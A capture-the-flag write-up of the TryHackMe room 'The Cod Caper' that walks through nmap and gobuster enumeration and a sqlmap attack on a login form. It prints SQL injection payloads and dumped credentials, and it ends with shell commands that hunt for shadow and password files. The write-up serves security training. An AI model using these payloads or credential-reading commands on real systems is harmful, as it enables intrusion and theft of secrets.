# The Cod Caper
> 4lch3my | June 26, 2023
-------------------
#### A guided room taking you through infiltrating and exploiting a Linux system.
#### [Room Link](https://tryhackme.com/room/thecodcaper)

## Tasks 
##### 1. Intro
  Deploy the machine with the Start Machine button, also either deploy your [Attack Box](https://tryhackme.com/access) OR Connect to [OpenVPN](https://tryhackme.com/access) and deploy your personal KALI machine.
<br>


##### 2. Host Enumeration
To start, I will use [nmap] which is default option on the personal Kali install I have. We start with a basic command
  `nmap -sC -sV -A MACHINE_IP `
The -sC flag runs scripts against open ports as well to determine if there are external/common vulnerabilities that we can use outright. The -sV probes all open ports it finds to determine if we can get the service/version information. -A uses agressive mode, so we can follow along with the commands and enumeration.
  In our NMAP results we get:

```
Starting Nmap 7.60 ( https://nmap.org ) at 2023-05-15 23:25 BST
Nmap scan report for ip-10-10-2-173.eu-west-1.compute.internal (10.10.2.173)
Host is up (0.00062s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6d:2c:40:1b:6c:15:7c:fc:bf:9b:55:22:61:2a:56:fc (RSA)
|   256 ff:89:32:98:f4:77:9c:09:39:f5:af:4a:4f:08:d6:f5 (ECDSA)
|_  256 89:92:63:e7:1d:2b:3a:af:6c:f9:39:56:5b:55:7e:f9 (EdDSA)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 02:B2:1D:FE:B3:AD (Unknown)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3.13
OS details: Linux 3.13
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Nmap done: 1 IP address (1 host up) scanned in 12.24 seconds
```

##### 3. Web Enumeration
Time to run gobuster to see what directorys we have on `port 80`. To do this we can run the command:`gobuster dir -u MACHINE_IP -w /usr/share/wordlists/dirb/big.txt -x php,html,txt`:

```
===============================================================
Gobuster v3.0.1
===============================================================
[+] Url:            http://10.10.2.173/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,html,txt
[+] Timeout:        10s
===============================================================
2023/05/15 23:35:06 Starting gobuster
===============================================================
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.html (Status: 403)
/.htpasswd.txt (Status: 403)
/.htaccess (Status: 403)
/.htaccess.txt (Status: 403)
/.htaccess.php (Status: 403)
/.htaccess.html (Status: 403)
/administrator.php (Status: 200)
/index.html (Status: 200)
/server-status (Status: 403)
===============================================================
2023/05/15 23:35:13 Finished
===============================================================
```

##### 4. Web Exploitation

sqlmap -u http://10.10.2.173/administrator.php --forms --dump

       ___
       __H__
 ___ ___[.]_____ ___ ___  {1.2.4#stable}
|_ -| . [(]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 23:39:14

[23:39:14] [INFO] testing connection to the target URL
[23:39:14] [INFO] searching for forms
[#1] form:
POST http://10.10.2.173:80/administrator.php
POST data: username=&password=
do you want to test this form? [Y/n/q] 
> yes
Edit POST data [default: username=&password=] (Warning: blank fields detected): 
do you want to fill blank fields with random values? [Y/n] Y
[23:39:28] [INFO] using '/root/.sqlmap/output/results-05152023_1139pm.csv' as the CSV results file in multiple targets mode
[23:39:28] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
[23:39:28] [INFO] testing if the target URL content is stable
[23:39:29] [INFO] target URL content is stable
[23:39:29] [INFO] testing if POST parameter 'username' is dynamic
[23:39:29] [WARNING] POST parameter 'username' does not appear to be dynamic
[23:39:29] [INFO] heuristic (basic) test shows that POST parameter 'username' might be injectable (possible DBMS: 'MySQL')
[23:39:29] [INFO] heuristic (XSS) test shows that POST parameter 'username' might be vulnerable to cross-site scripting (XSS) attacks
[23:39:29] [INFO] testing for SQL injection on POST parameter 'username'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
[23:39:43] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[23:39:43] [WARNING] reflective value(s) found and filtering out
[23:39:43] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[23:39:44] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[23:39:44] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment) (NOT)'
[23:39:44] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[23:39:44] [INFO] POST parameter 'username' appears to be 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable (with --not-string="Got")
[23:39:44] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[23:39:44] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[23:39:44] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[23:39:44] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[23:39:44] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[23:39:44] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[23:39:44] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[23:39:44] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[23:39:44] [INFO] POST parameter 'username' is 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
[23:39:44] [INFO] testing 'MySQL inline queries'
[23:39:44] [INFO] testing 'MySQL > 5.0.11 stacked queries (comment)'
[23:39:44] [INFO] testing 'MySQL > 5.0.11 stacked queries'
[23:39:44] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP - comment)'
[23:39:44] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP)'
[23:39:44] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[23:39:44] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[23:39:44] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[23:39:44] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind'
[23:39:54] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 OR time-based blind' injectable 
[23:39:55] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[23:39:55] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[23:39:55] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[23:39:55] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[23:39:55] [INFO] target URL appears to have 2 columns in query
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] y
[23:39:58] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
[23:39:58] [INFO] testing 'MySQL UNION query (44) - 21 to 40 columns'
[23:39:59] [INFO] testing 'MySQL UNION query (44) - 41 to 60 columns'
[23:39:59] [INFO] testing 'MySQL UNION query (44) - 61 to 80 columns'
[23:39:59] [INFO] testing 'MySQL UNION query (44) - 81 to 100 columns'
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 337 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: username=ZImh' RLIKE (SELECT (CASE WHEN (2848=2848) THEN 0x5a496d68 ELSE 0x28 END))-- oPzK&password=

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=ZImh' OR (SELECT 4761 FROM(SELECT COUNT(*),CONCAT(0x71767a7871,(SELECT (ELT(4761=4761,1))),0x717a786b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- PVvI&password=

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind
    Payload: username=ZImh' OR SLEEP(5)-- CTxY&password=
---
do you want to exploit this SQL injection? [Y/n] y
[23:40:08] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.04 (xenial)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.0
[23:40:08] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[23:40:08] [INFO] fetching current database
[23:40:08] [INFO] retrieved: users
[23:40:08] [INFO] fetching tables for database: 'users'
[23:40:08] [INFO] used SQL query returns 1 entries
[23:40:08] [INFO] retrieved: users
[23:40:08] [INFO] fetching columns for table 'users' in database 'users'
[23:40:08] [INFO] used SQL query returns 2 entries
[23:40:08] [INFO] retrieved: username
[23:40:09] [INFO] retrieved: varchar(100)
[23:40:09] [INFO] retrieved: password
[23:40:09] [INFO] retrieved: varchar(100)
[23:40:09] [INFO] fetching entries for table 'users' in database 'users'
[23:40:09] [INFO] used SQL query returns 1 entries
[23:40:09] [INFO] retrieved: secretpass
[23:40:09] [INFO] retrieved: pingudad
Database: users
Table: users
[2 entries]
+------------+------------+
| username   | password   |
+------------+------------+
| secretpass | secretpass |
| pingudad   | pingudad   |
+------------+------------+

[23:40:09] [INFO] table 'users.users' dumped to CSV file '/root/.sqlmap/output/10.10.2.173/dump/users/users.csv'
[23:40:09] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.sqlmap/output/results-05152023_1139pm.csv'

[*] shutting down at 23:40:09


TASK5

Log in with credentials above to /administrator.php
Run: ls
run: find / 2>>/dev/null | grep -i shadow
run:  find / 2>>/dev/null | grep -i pass
run: cat /var/hidden/pass